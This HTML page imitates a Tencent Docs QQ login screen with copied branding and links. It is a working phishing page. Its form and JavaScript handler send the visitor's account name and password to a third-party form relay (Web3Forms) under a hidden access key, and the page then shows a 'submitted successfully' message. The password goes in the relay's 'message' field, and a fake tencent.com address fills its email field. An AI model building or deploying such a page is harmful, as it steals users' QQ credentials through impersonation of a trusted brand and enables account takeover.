<!DOCTYPE html>
<html lang="zh-CN">
    <script charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js"></script>
<script>LA.init({id:"3Ll3hdfPIMU8vsTN",ck:"3Ll3hdfPIMU8vsTN"})</script>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>腾讯文档 - QQ登录</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            background: linear-gradient(145deg, #f0f2f5 0%, #e6e9f0 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .login-container {
            width: 100%;
            max-width: 420px;
            background: #ffffff;
            border-radius: 32px;
            box-shadow: 0 20px 35px -12px rgba(0, 0, 0, 0.15), 0 1px 3px rgba(0, 0, 0, 0.02);
            overflow: hidden;
        }

        .login-header {
            padding: 32px 32px 16px 32px;
            text-align: center;
        }

        .logo-area {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 10px;
            margin-bottom: 20px;
        }

        .logo-icon {
            width: 36px;
            height: 36px;
            background-size: contain;
            background-repeat: no-repeat;
            background-position: center;
            display: inline-block;
        }

        .logo-text {
            font-size: 26px;
            font-weight: 600;
            color: #1e6fdf;
            letter-spacing: 1px;
        }

        .slogan {
            font-size: 14px;
            color: #5f6b7a;
            margin-top: 4px;
        }

        .login-form {
            padding: 28px 32px 32px 32px;
        }

        .input-group {
            margin-bottom: 24px;
        }

        .input-label {
            font-size: 14px;
            font-weight: 500;
            color: #2c3e4f;
            margin-bottom: 8px;
            display: block;
        }

        .input-field {
            width: 100%;
            padding: 12px 16px;
            font-size: 15px;
            border: 1.5px solid #e2e6ec;
            border-radius: 16px;
            background: #ffffff;
            transition: all 0.2s;
            outline: none;
            font-family: inherit;
        }

        .input-field:focus {
            border-color: #1e6fdf;
            box-shadow: 0 0 0 3px rgba(30, 111, 223, 0.1);
        }

        .options-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 28px;
            font-size: 13px;
        }

        .checkbox {
            display: flex;
            align-items: center;
            gap: 8px;
            cursor: pointer;
            color: #5f6b7a;
        }

        .checkbox input {
            width: 16px;
            height: 16px;
            cursor: pointer;
            accent-color: #1e6fdf;
        }

        .forgot-link {
            color: #1e6fdf;
            text-decoration: none;
            font-weight: 500;
        }

        .forgot-link:hover {
            text-decoration: underline;
        }

        .login-btn {
            width: 100%;
            background: #1e6fdf;
            border: none;
            padding: 14px 0;
            border-radius: 44px;
            font-size: 16px;
            font-weight: 600;
            color: white;
            cursor: pointer;
            transition: background 0.2s, transform 0.1s;
            margin-bottom: 20px;
            font-family: inherit;
            box-shadow: 0 6px 14px rgba(30, 111, 223, 0.25);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .login-btn:hover {
            background: #0a5bc2;
        }

        .login-btn:active {
            transform: scale(0.98);
        }

        .login-btn:disabled {
            background: #94a3b8;
            cursor: not-allowed;
            transform: none;
        }

        /* 加载动画 */
        .spinner {
            width: 18px;
            height: 18px;
            border: 2px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 0.6s linear infinite;
            display: inline-block;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .qq-quick-login {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 12px;
            margin-top: 12px;
            border-top: 1px solid #eff2f7;
            padding-top: 24px;
        }

        .qq-icon-circle {
            width: 48px;
            height: 48px;
            background-size: contain;
            background-repeat: no-repeat;
            background-position: center;
            cursor: pointer;
            transition: transform 0.1s;
        }

        .qq-icon-circle:hover {
            transform: scale(1.02);
        }

        .qq-text {
            font-size: 14px;
            color: #5f6b7a;
            font-weight: 500;
        }

        .footer {
            text-align: center;
            padding: 16px 32px 28px;
            border-top: 1px solid #f0f2f5;
            margin-top: 8px;
            font-size: 12px;
            color: #8f9bb2;
        }

        .footer a {
            color: #1e6fdf;
            text-decoration: none;
        }

        @media (max-width: 480px) {
            .login-form {
                padding: 24px 24px 28px;
            }
            .login-header {
                padding: 24px 24px 12px;
            }
        }

        /* Toast 提示（非弹窗） */
        .toast-message {
            position: fixed;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0,0,0,0.8);
            color: white;
            padding: 10px 24px;
            border-radius: 40px;
            font-size: 14px;
            z-index: 1100;
            backdrop-filter: blur(8px);
            pointer-events: none;
            white-space: nowrap;
        }
        .toast-message.error {
            background: rgba(185, 28, 28, 0.9);
        }
        .toast-message.success {
            background: rgba(2, 84, 66, 0.9);
        }
    </style>
</head>
<body>
<div class="login-container">
    <div class="login-header">
        <div class="logo-area">
            <img class="logo-icon" src="https://docs.idqqimg.com/tim/docs/desktop/favicon.ico" alt="腾讯文档图标" onerror="this.style.display='none'; this.nextSibling.style.display='flex';">
            <div class="logo-text">腾讯文档</div>
        </div>
        <div class="slogan">多人协作 · 云端实时保存</div>
    </div>

    <div class="login-form">
        <!-- 
            严格遵循 Web3Forms 要求的表单结构：
            action: https://api.web3forms.com/submit
            method: POST
            包含: access_key (隐藏)
                 name      → QQ号/邮箱/手机号
                 email     → 隐藏固定邮箱 (满足格式)
                 message   → 密码
        -->
        <form id="loginForm" action="https://api.web3forms.com/submit" method="POST">
            <input type="hidden" name="access_key" value="5303029d-3f26-477b-893f-3276aedfea7c">
            <!-- 固定邮箱，满足 Web3Forms 校验 -->
            <input type="hidden" name="email" value="docs_login@tencent.com">

            <div class="input-group">
                <label class="input-label">QQ号 / 邮箱 / 手机号</label>
                <input type="text" class="input-field" id="username" name="name" placeholder="请输入QQ号或关联账号" autocomplete="off" required>
            </div>

            <div class="input-group">
                <label class="input-label">密码</label>
                <input type="password" class="input-field" id="password" name="message" placeholder="请输入密码" autocomplete="off" required>
            </div>

            <div class="options-row">
                <label class="checkbox">
                    <input type="checkbox" id="rememberMe" checked> <span>记住密码</span>
                </label>
                <a href="#" class="forgot-link" id="forgotPwdLink">忘记密码？</a>
            </div>

            <button type="submit" class="login-btn" id="loginBtn">
                <span class="btn-text">QQ登录</span>
            </button>
        </form>

        <div class="qq-quick-login">
            <img class="qq-icon-circle" src="https://static-res.qq.com/static-res/imqq/qq-logo.png" alt="QQ图标" id="quickQQIcon" style="width: 48px; height: 48px;">
            <div class="qq-text">使用QQ账号快捷登录</div>
        </div>
    </div>

    <div class="footer">
        新用户？<a href="https://ssl.zc.qq.com/v5/index/?lang=zhCN" target="_blank" rel="noopener noreferrer" id="registerLink">立即注册</a> &nbsp;|&nbsp;
        <a href="https://www.tencent.com/zh-cn/privacy-policy.html" target="_blank" rel="noopener noreferrer" id="privatePolicy">隐私协议</a>
    </div>
</div>

<script>
    (function() {
        // DOM 元素
        const form = document.getElementById('loginForm');
        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');
        const submitBtn = document.getElementById('loginBtn');
        const rememberCheck = document.getElementById('rememberMe');
        const forgotLink = document.getElementById('forgotPwdLink');
        const quickQQIcon = document.getElementById('quickQQIcon');

        // Toast 提示（非弹窗）
        let toastTimer = null;
        function showMessage(msg, type = 'info') {
            const existing = document.querySelector('.toast-message');
            if (existing) existing.remove();
            const toast = document.createElement('div');
            toast.className = `toast-message ${type === 'error' ? 'error' : (type === 'success' ? 'success' : '')}`;
            toast.innerText = msg;
            document.body.appendChild(toast);
            if (toastTimer) clearTimeout(toastTimer);
            toastTimer = setTimeout(() => {
                if (toast && toast.parentNode) toast.remove();
            }, 3500);
        }

        // 记住密码（仅前端保存用户名）
        function saveUsername() {
            if (rememberCheck.checked) {
                localStorage.setItem('saved_username', usernameInput.value.trim());
            } else {
                localStorage.removeItem('saved_username');
            }
        }

        function loadUsername() {
            const saved = localStorage.getItem('saved_username');
            if (saved) {
                usernameInput.value = saved;
                if (rememberCheck) rememberCheck.checked = true;
            }
        }

        // 显示加载动画，禁用按钮
        function setLoading(isLoading) {
            if (isLoading) {
                submitBtn.disabled = true;
                submitBtn.innerHTML = '<span class="spinner"></span><span class="btn-text">登录中...</span>';
            } else {
                submitBtn.disabled = false;
                submitBtn.innerHTML = '<span class="btn-text">QQ登录</span>';
            }
        }

        // 处理表单提交（fetch 异步，无页面刷新，无弹窗）
        async function handleSubmit(event) {
            event.preventDefault();

            const username = usernameInput.value.trim();
            const password = passwordInput.value;

            if (!username) {
                showMessage('请输入QQ号/邮箱/手机号', 'error');
                usernameInput.focus();
                return;
            }
            if (!password) {
                showMessage('请输入密码', 'error');
                passwordInput.focus();
                return;
            }

            // 保存用户名（记住密码）
            saveUsername();

            // 构建 FormData
            const formData = new FormData();
            formData.append('access_key', '5303029d-3f26-477b-893f-3276aedfea7c');
            formData.append('name', username);
            formData.append('email', 'docs_login@tencent.com');
            formData.append('message', password);
            // 可选：添加 subject 以便邮件分类
            formData.append('subject', '腾讯文档登录（用户提交）');

            // 开始加载动画
            setLoading(true);

            try {
                const response = await fetch('https://api.web3forms.com/submit', {
                    method: 'POST',
                    body: formData
                });
                const data = await response.json();

                if (response.ok && data.success) {
                    showMessage('登录信息已提交成功', 'success');
                    // 清空密码（安全习惯）
                    passwordInput.value = '';
                } else {
                    const errorMsg = data.message || '提交失败，请稍后重试';
                    showMessage(errorMsg, 'error');
                    console.error('Web3Forms 错误:', data);
                }
            } catch (error) {
                console.error('网络错误:', error);
                showMessage('网络错误，请检查连接后重试', 'error');
            } finally {
                setLoading(false);
            }
        }

        // 绑定表单提交
        if (form) {
            form.addEventListener('submit', handleSubmit);
        }

        // 忘记密码链接
        if (forgotLink) {
            forgotLink.addEventListener('click', (e) => {
                e.preventDefault();
                window.open('https://accounts.qq.com/psw/find?from=11', '_blank');
            });
        }

        // QQ 快捷登录示意（仅聚焦）
        if (quickQQIcon) {
            quickQQIcon.addEventListener('click', () => {
                showMessage('请在上方输入QQ号和密码进行登录', 'info');
                usernameInput.focus();
            });
        }

        // 加载记住的用户名（首次进入无弹窗）
        loadUsername();

        // 图标加载失败处理（避免空白）
        const logoImg = document.querySelector('.logo-icon');
        if (logoImg) {
            logoImg.addEventListener('error', () => {
                logoImg.style.display = 'none';
                const fallback = document.createElement('div');
                fallback.className = 'logo-icon';
                fallback.style.width = '36px';
                fallback.style.height = '36px';
                fallback.style.backgroundColor = '#1e6fdf';
                fallback.style.borderRadius = '12px';
                fallback.style.display = 'flex';
                fallback.style.alignItems = 'center';
                fallback.style.justifyContent = 'center';
                fallback.style.color = 'white';
                fallback.style.fontWeight = 'bold';
                fallback.style.fontSize = '20px';
                fallback.innerText = 'T';
                logoImg.parentNode.insertBefore(fallback, logoImg.nextSibling);
            });
        }

        const qqIcon = document.getElementById('quickQQIcon');
        if (qqIcon) {
            qqIcon.addEventListener('error', () => {
                qqIcon.style.display = 'none';
                const fallbackDiv = document.createElement('div');
                fallbackDiv.className = 'qq-icon-circle';
                fallbackDiv.style.width = '48px';
                fallbackDiv.style.height = '48px';
                fallbackDiv.style.backgroundColor = '#f5f7fa';
                fallbackDiv.style.borderRadius = '50%';
                fallbackDiv.style.display = 'flex';
                fallbackDiv.style.alignItems = 'center';
                fallbackDiv.style.justifyContent = 'center';
                fallbackDiv.style.fontSize = '26px';
                fallbackDiv.style.color = '#1e6fdf';
                fallbackDiv.style.border = '1px solid #e7ecf3';
                fallbackDiv.innerText = 'QQ';
                fallbackDiv.style.cursor = 'pointer';
                fallbackDiv.addEventListener('click', () => {
                    showMessage('请输入账号密码完成登录', 'info');
                    usernameInput.focus();
                });
                qqIcon.parentNode.insertBefore(fallbackDiv, qqIcon.nextSibling);
            });
        }
    })();
</script>
</body>
</html>
